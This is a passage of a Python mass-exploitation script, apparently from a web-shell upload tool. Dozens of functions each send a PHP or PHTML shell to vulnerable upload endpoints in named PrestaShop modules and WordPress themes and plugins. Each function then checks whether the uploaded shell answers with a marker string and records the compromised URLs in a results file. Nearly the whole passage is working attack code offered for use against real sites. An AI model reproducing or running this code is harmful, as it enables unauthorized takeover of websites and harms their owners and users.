			print(f"{blue}|- {white}http://{url} {white}| {yellow}Propagead2 -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}Propagead2 -->> {red}Not Vuln !")
	except:pass     
 
def Vtemslide(url):
	try:
		data = {'userfile':open(phtml, 'rb')}
		p = ('https://' + url + '/modules/vtemslideshow/uploadimage.php')
		c = ('http://' + url+'/modules/vtemslideshow/slides/axv.phtml')
		requests.post(p, headers=ua, files=data, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}Vtemslideshow -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}Vtemslideshow -->> {red}Not Vuln !")
	except:pass     
 
def Realty(url):
	try:
		data = {'userfile':open(phtml, 'rb')}
		p = ('https://' + url + '/modules/realty/include/uploadimage.php')
		c = ('http://' + url+'/modules/realty/include/slides/axv.phtml')
		requests.post(p, headers=ua, files=data, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}Realty -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}Realty -->> {red}Not Vuln !")
	except:pass
 
def Realty3(url):
	try:
		data = {'userfile':open(phtml, 'rb')}
		p = ('https://' + url + '/modules/realty/evogallery/uploadimage.php')
		c = ('http://' + url+'/modules/realty/evogallery/slides/axv.phtml')
		requests.post(p, headers=ua, files=data, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}Realty 3 -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}Realty 3 -->> {red}Not Vuln !")
	except:pass
 
def Realty4(url):
	try:
		data = {'userfile':open(phtml, 'rb')}
		p = ('https://' + url + '/modules/realty/evogallery2/uploadimage.php')
		c = ('http://' + url+'/modules/realty/evogallery2/slides/axv.phtml')
		requests.post(p, headers=ua, files=data, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}Realty 4 -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}Realty 4 -->> {red}Not Vuln !")
	except:pass
 
def Premeg(url):
	try:
		data = {'userfile':open(phtml, 'rb')}
		p = ('https://' + url + '/modules/megaproduct/')
		c = ('http://' + url+'/modules/megaproduct/axv.phtml')
		requests.post(p, headers=ua, files=data, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}Megaproduct -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}Megaproduct -->> {red}Not Vuln !")
	except:pass
 
def Soof2(url):
	try:
		data = {'userfile':open(php, 'rb')}
		p = ('https://' + url + '/modules/soopamobile2/uploadimage.php')
		c = ('http://' + url+'/modules/soopamobile2/slides/axv.php')
		requests.post(p, headers=ua, files=data, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}Soopamobile 2 -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}Soopamobile 2 -->> {red}Not Vuln !")
	except:pass
 
def Soof3(url):
	try:
		data = {'userfile':open(php, 'rb')}
		p = ('https://' + url + '/modules/soopamobile3/uploadimage.php')
		c = ('http://' + url+'/modules/soopamobile3/slides/axv.php')
		requests.post(p, headers=ua, files=data, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}Soopamobile 3 -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}Soopamobile 3 -->> {red}Not Vuln !")
	except:pass
 
def Fupload(url):
	try:
		data = {'userfile':open(php, 'rb')}
		p = ('https://' + url + '/modules/filesupload/upload.php')
		c = ('http://' + url+'/modules/filesupload/uploads/axv.php')
		requests.post(p, headers=ua, files=data, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}Files Upload -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}Files Upload -->> {red}Not Vuln !")
	except:pass
 
def jro2(url):
	try:
		data = {'userfile':open(php, 'rb')}
		p = ('https://' + url + '/modules/jro_homepageadvertise2/uploadimage.php')
		c = ('http://' + url+'/modules/jro_homepageadvertise2/slides/axv.php')
		requests.post(p, headers=ua, files=data, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}JRO_HOMEPAGEADVERTISE 2 -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}JRO_HOMEPAGEADVERTISE 2 -->> {red}Not Vuln !")
	except:pass
 
def leo(url):
	try:
		data = {'userfile':open(php, 'rb')}
		p = ('https://' + url + '/modules/leosliderlayer/uploadimage.php')
		c = ('http://' + url+'/modules/leosliderlayer/slides/axv.php')
		requests.post(p, headers=ua, files=data, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}Leosliderlayer -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}Leosliderlayer -->> {red}Not Vuln !")
	except:pass
 
def leo2(url):
	try:
		data = {'userfile':open(php, 'rb')}
		p = ('https://' + url + '/modules/leosliderlayer/upload_image.php')
		c = ('http://' + url+'/modules/leosliderlayer/slides/axv.php')
		requests.post(p, headers=ua, files=data, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}Leosliderlayer 2 -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}Leosliderlayer 2 -->> {red}Not Vuln !")
	except:pass
 
def leo3(url):
	try:
		data = {'userfile':open(php, 'rb')}
		p = ('https://' + url + '/modules/leosliderlayer/upload.php')
		c = ('http://' + url+'/modules/leosliderlayer/slides/axv.php')
		requests.post(p, headers=ua, files=data, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}Leosliderlayer 3 -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}Leosliderlayer 3 -->> {red}Not Vuln !")
	except:pass
 
def kitter(url):
	try:
		data = {'userfile':open(php, 'rb')}
		p = ('https://' + url + '/modules/vtemskitter/uploadimage.php')
		c = ('http://' + url+'/modules/vtemskitter/img/axv.php')
		requests.post(p, headers=ua, files=data, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}Vtemskitter -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}Vtemskitter -->> {red}Not Vuln !")
	except:pass
 
def add(url):
	try:
		data = {'userfile':open(php, 'rb')}
		p = ('https://' + url + '/modules/additionalproductstabs/file_upload.php')
		c = ('http://' + url+'/modules/additionalproductstabs/file_uploads/axv.php')
		requests.post(p, headers=ua, files=data, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}Additionalproductstabs -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}Additionalproductstabs -->> {red}Not Vuln !")
	except:pass
 
def addthis(url):
	try:
		data = {'userfile':open(php, 'rb')}
		p = ('https://' + url + '/modules/addthisplugin/file_upload.php')
		c = ('http://' + url+'/modules/addthisplugin/file_uploads/axv.php')
		requests.post(p, headers=ua, files=data, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}Additionalproductstabs 2 -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}Additionalproductstabs 2 -->> {red}Not Vuln !")
	except:pass
 
def attri3(url):
	try:
		data = {'userfile':open(php, 'rb')}
		p = ('https://' + url + '/modules/attributewizardpro1/file_upload.php')
		c = ('http://' + url+'/modules/attributewizardpro1/file_uploads/axv.php')
		requests.post(p, headers=ua, files=data, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}Attributewizardpro -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}Attributewizardpro -->> {red}Not Vuln !")
	except:pass
 
def pkvert(url):
	try:
		data = {'images[]':open(php, 'rb')}
		p = ('https://' + url + '/modules/pk_vertflexmenu/ajax/upload.php')
		c = ('http://' + url+'/modules/pk_vertflexmenu/uploads/axv.php')
		requests.post(p, headers=ua, files=data, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}Pk Vertflexmenu -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}Pk Vertflexmenu -->> {red}Not Vuln !")
	except:pass
 
def blocktesti(url):
	try:
		data = {'images[]':open(php, 'rb')}
		p = ('https://' + url + '/modules/blocktestimonial/addtestimonial.php')
		c = ('http://' + url+'/upload/axv.phtml')
		requests.post(p, headers=ua, files=data, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}Blocktestimonial -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}Blocktestimonial -->> {red}Not Vuln !")
	except:pass

def Buddywp(url):
	try:
		data = {'formData': (phpjpg, shell, 'text/html')}
		p = ('https://' + url + '/wp-content/plugins/buddypress-media/app/helper/rtUploadAttachment.php')
		c = ('http://' + url+'/wp-content/uploads/rtMedia/tmp/axv2.php.jpg')
		requests.post(p, headers=ua, files=data, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}Buddypress-Media -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}Buddypress-Media -->> {red}Not Vuln !")
	except:pass       
 
def Buddywp2(url):
	try:
		data = {'formData':open(phpjpg, 'rb')}
		p = ('https://' + url + '/wp-content/plugins/buddypress-media/app/helper/rtUploadAttachment.php')
		c = ('http://' + url+'/wp-content/uploads/rtMedia/tmp/axv2.php.jpg')
		requests.post(p, headers=ua, files=data, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}Buddypress-Media2 -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}Buddypress-Media2 -->> {red}Not Vuln !")
	except:pass   
 
def Cameleon(url):
	try:
		data = {'qqfile':open(php, 'rb')}
		p = ('https://' + url + '/wp-content/themes/cameleon/includes/fileuploader/upload_handler.php')
		c = ('http://' + url+'/wp-content/uploads/'+str(tahun)+'/'+str(bulan)+'/axv.php')
		requests.post(p, headers=ua, files=data, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}Cameleon -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}Cameleon -->> {red}Not Vuln !")
	except:pass
 
def Agritourismo(url):
	try:
		data = {'orange_themes':open(php, 'rb')}
		p = ('https://' + url + '/wp-content/themes/agritourismo-theme/functions/upload-handler.php')
		c = ('http://' + url+'/wp-content/uploads/'+str(tahun)+'/'+str(bulan)+'/axv.php')
		requests.post(p, headers=ua, files=data, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}Agritourismo -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}Agritourismo -->> {red}Not Vuln !")
	except:pass
 
def Bulteno(url):
	try:
		data = {'orange_themes':open(php, 'rb')}
		p = ('https://' + url + '/wp-content/themes/bulteno-theme/functions/upload-handler.php')
		c = ('http://' + url+'/wp-content/uploads/'+str(tahun)+'/'+str(bulan)+'/axv.php')
		requests.post(p, headers=ua, files=data, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}Bulteno -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}Bulteno -->> {red}Not Vuln !")
	except:pass
 
def Oxygen(url):
	try:
		data = {'orange_themes':open(php, 'rb')}
		p = ('https://' + url + '/wp-content/themes/oxygen-theme/functions/upload-handler.php')
		c = ('http://' + url+'/wp-content/uploads/'+str(tahun)+'/'+str(bulan)+'/axv.php')
		requests.post(p, headers=ua, files=data, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}Oxygen -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}Oxygen -->> {red}Not Vuln !")
	except:pass
 
def Radial(url):
	try:
		data = {'orange_themes':open(php, 'rb')}
		p = ('https://' + url + '/wp-content/themes/radial-theme/functions/upload-handler.php')
		c = ('http://' + url+'/wp-content/uploads/'+str(tahun)+'/'+str(bulan)+'/axv.php')
		requests.post(p, headers=ua, files=data, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}Radial -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}Radial -->> {red}Not Vuln !")
	except:pass
 
def Rayoflight(url):
	try:
		data = {'orange_themes':open(php, 'rb')}
		p = ('https://' + url + '/wp-content/themes/rayoflight-theme/functions/upload-handler.php')
		c = ('http://' + url+'/wp-content/uploads/'+str(tahun)+'/'+str(bulan)+'/axv.php')
		requests.post(p, headers=ua, files=data, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}Rayoflight -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}Rayoflight -->> {red}Not Vuln !")
	except:pass
 
def Reganto(url):
	try:
		data = {'orange_themes':open(php, 'rb')}
		p = ('https://' + url + '/wp-content/themes/reganto-theme/functions/upload-handler.php')
		c = ('http://' + url+'/wp-content/uploads/'+str(tahun)+'/'+str(bulan)+'/axv.php')
		requests.post(p, headers=ua, files=data, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}Reganto -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}Reganto -->> {red}Not Vuln !")
	except:pass
 
def Bordeaux(url):
	try:
		data = {'orange_themes':open(php, 'rb')}
		p = ('https://' + url + '/wp-content/themes/bordeaux-theme/functions/upload-handler.php')
		c = ('http://' + url+'/wp-content/uploads/'+str(tahun)+'/'+str(bulan)+'/axv.php')
		requests.post(p, headers=ua, files=data, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}Bordeaux -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}Bordeaux -->> {red}Not Vuln !")
	except:pass
 
def Rockstar(url):
	try:
		data = {'orange_themes':open(php, 'rb')}
		p = ('https://' + url + '/wp-content/themes/rockstar-theme/functions/upload-handler.php')
		c = ('http://' + url+'/wp-content/uploads/'+str(tahun)+'/'+str(bulan)+'/axv.php')
		requests.post(p, headers=ua, files=data, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}Rockstar -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}Rockstar -->> {red}Not Vuln !")
	except:pass
 
def Qualifire(url):
	try:
		data = {'Filedata':open(php, 'rb')}
		p = ('https://' + url + '/wp-content/themes/qualifire/scripts/admin/uploadify/uploadify.php')
		c = ('http://' + url+'/wp-content/themes/qualifire/scripts/admin/uploadify/axv.php')
		requests.post(p, headers=ua, files=data, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}Qualifire -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}Qualifire -->> {red}Not Vuln !")
	except:pass
 
def Ghost(url):
	try:
		data = {'Filedata':open(php, 'rb')}
		p = ('https://' + url + '/wp-content/themes/Ghost/includes/uploadify/upload_Settings2_image.php')
		c = ('http://' + url+'/wp-content/uploads/settingsimages/axv.php')
		requests.post(p, headers=ua, files=data, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}Ghost -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}Ghost -->> {red}Not Vuln !")
	except:pass
 
def Anthology(url):
	try:
		data = {'pexetofile':open(phtml, 'rb')}
		p = ('https://' + url + '/wp-content/themes/Anthology/functions/upload-handler.php')
		c = ('http://' + url+'/wp-content/uploads/'+str(tahun)+'/'+str(bulan)+'/axv.phtml')
		requests.post(p, headers=ua, files=data, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}Anthology -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}Anthology -->> {red}Not Vuln !")
	except:pass
 
def Kiddo(url):
	try:
		data = {'Filedata':open(phtml, 'rb')}
		p = ('https://' + url + '/wp-content/themes/kiddo/app/assets/js/uploadify/uploadify.php')
		c = ('http://' + url+'/axv.phtml')
		requests.post(p, headers=ua, files=data, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}Kiddo -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}Kiddo -->> {red}Not Vuln !")
	except:pass
 
def Thisway(url):
	try:
		data = {'Filedata':open(php, 'rb')}
		p = ('https://' + url + '/wp-content/themes/ThisWay/includes/uploadify/upload_settings_image.php')
		c = ('http://' + url+'/wp-content/uploads/'+str(tahun)+'/'+str(bulan)+'/axv.php')
		requests.post(p, headers=ua, files=data, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}Thisway -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}Thisway -->> {red}Not Vuln !")
	except:pass
 
 
def UDesign(url):
	try:
		data = {'Filedata':open(php, 'rb')}
		p = ('https://' + url + '/wp-content/themes/u-design/scripts/admin/uploadify/uploadify.php')
		c = ('http://' + url+'/axv.php')
		requests.post(p, headers=ua, files=data, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}U-Design -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}U-Design -->> {red}Not Vuln !")
	except:pass
 
def Themify1(url):
	try:
		data = {'Filedata':open(php, 'rb')}
		p = ('https://' + url + '/wp-content/themes/elemin/themify/themify-ajax.php?upload=1')
		c = ('http://' + url+'/wp-content/themes/elemin/uploads/axv.php')
		requests.post(p, headers=ua, files=data, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}Elemin -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}Elemin -->> {red}Not Vuln !")
	except:pass
 
def Themify2(url):
	try:
		data = {'Filedata':open(php, 'rb')}
		p = ('https://' + url + '/wp-content/themes/tisa/themify/themify-ajax.php?upload=1')
		c = ('http://' + url+'/wp-content/themes/tisa/uploads/axv.php')
		requests.post(p, headers=ua, files=data, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}Tisa -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}Tisa -->> {red}Not Vuln !")
	except:pass

def Themify3(url):
	try:
		data = {'Filedata':open(php, 'rb')}
		p = ('https://' + url + '/wp-content/themes/funki/themify/themify-ajax.php?upload=1')
		c = ('http://' + url+'/wp-content/themes/funki/uploads/axv.php')
		requests.post(p, headers=ua, files=data, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}Funki -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}Funki -->> {red}Not Vuln !")
	except:pass
 
def Themify4(url):
	try:
		data = {'Filedata':open(php, 'rb')}
		p = ('https://' + url + '/wp-content/themes/pinboard/themify/themify-ajax.php?upload=1')
		c = ('http://' + url+'/wp-content/themes/pinboard/uploads/axv.php')
		requests.post(p, headers=ua, files=data, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}Pinboard -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}Pinboard -->> {red}Not Vuln !")
	except:pass
 
def Themify5(url):
	try:
		data = {'Filedata':open(php, 'rb')}
		p = ('https://' + url + '/wp-content/themes/folo/themify/themify-ajax.php?upload=1')
		c = ('http://' + url+'/wp-content/themes/folo/uploads/axv.php')
		requests.post(p, headers=ua, files=data, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}Folo -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}Folo -->> {red}Not Vuln !")
	except:pass
 
def Themify6(url):
	try:
		data = {'Filedata':open(php, 'rb')}
		p = ('https://' + url + '/wp-content/themes/grido/themify/themify-ajax.php?upload=1')
		c = ('http://' + url+'/wp-content/themes/grido/uploads/axv.php')
		requests.post(p, headers=ua, files=data, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}Grido -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}Grido -->> {red}Not Vuln !")
	except:pass
 
def Themify7(url):
	try:
		data = {'Filedata':open(php, 'rb')}
		p = ('https://' + url + '/wp-content/themes/suco/themify/themify-ajax.php?upload=1')
		c = ('http://' + url+'/wp-content/themes/suco/uploads/axv.php')
		requests.post(p, headers=ua, files=data, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}Suco -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}Suco -->> {red}Not Vuln !")
	except:pass
 
def Themify8(url):
	try:
		data = {'Filedata':open(php, 'rb')}
		p = ('https://' + url + '/wp-content/themes/ithemes2/themify/themify-ajax.php?upload=1')
		c = ('http://' + url+'/wp-content/themes/ithemes2/uploads/axv.php')
		requests.post(p, headers=ua, files=data, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}iThemes2 -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}iThemes2 -->> {red}Not Vuln !")
	except:pass
 
def Themify9(url):
	try:
		data = {'Filedata':open(php, 'rb')}
		p = ('https://' + url + '/wp-content/themes/basic/themify/themify-ajax.php?upload=1')
		c = ('http://' + url+'/wp-content/themes/basic/uploads/axv.php')
		requests.post(p, headers=ua, files=data, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}Basic -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}Basic -->> {red}Not Vuln !")
	except:pass
 
def Rightnow(url):
	try:
		data = {'Filedata':open(php, 'rb')}
		p = ('https://' + url + '/wp-content/themes/RightNow/includes/uploadify/upload_background_image.php')
		c = ('http://' + url+'/wp-content/uploads/galleryimages/axv.php')
		requests.post(p, headers=ua, files=data, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}RightNow -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}RightNow -->> {red}Not Vuln !")
	except:pass
 
def Coldfusion(url):
	try:
		data = {'Filedata':open(php, 'rb')}
		p = ('https://' + url + '/wp-content/themes/Coldfusion/includes/uploadify/upload_settings2_image.php')
		c = ('http://' + url+'/wp-content/uploads/settings2images/axv.php')
		requests.post(p, headers=ua, files=data, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}Coldfusion -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}Coldfusion -->> {red}Not Vuln !")
	except:pass
 
def Magicfields(url):
	try:
		data = {'qqfile':open(php, 'rb')}
		p = ('https://' + url + '/wp-content/plugins/magic-fields/RCCWP_upload_ajax.php')
		c = ('http://' + url+'/wp-content/files_mf/axv.php')
		requests.post(p, headers=ua, files=data, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}Magicfields Plugins -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}Magicfields Plugins -->> {red}Not Vuln !")
	except:pass
 
def Konzept(url):
	try:
		data = {'file':open(php, 'rb')}
